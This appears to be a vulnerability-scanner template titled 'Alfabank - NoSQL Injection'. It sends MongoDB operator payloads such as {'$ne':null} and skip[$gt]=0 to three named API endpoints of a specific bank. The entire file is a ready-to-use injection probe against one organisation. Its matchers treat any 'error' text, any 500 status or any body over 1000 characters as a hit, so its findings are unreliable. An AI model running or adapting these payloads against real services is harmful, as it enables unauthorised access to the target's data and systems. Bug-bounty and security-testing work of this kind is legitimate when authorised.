id: alfabank-nosql-injection

info:
  name: Alfabank - NoSQL Injection
  author: bugbounty
  severity: high
  description: NoSQL injection in JSON/MongoDB endpoints
  tags: nosqli,mongodb,alfabank

http:
  - raw:
      - |
        POST /api/search/fulltext HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"query":{"$ne":null},"version":"1.3"}

      - |
        GET /api/public/courses/list?skip[$gt]=0 HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /api/v2/geo-facade/cities HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"fiasId":{"$ne":""},"path":{"$gt":""}}

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "MongoError"
          - "error"
          - "exception"

      - type: status
        status:
          - 500

      - type: dsl
        dsl:
          - 'len(body) > 1000'
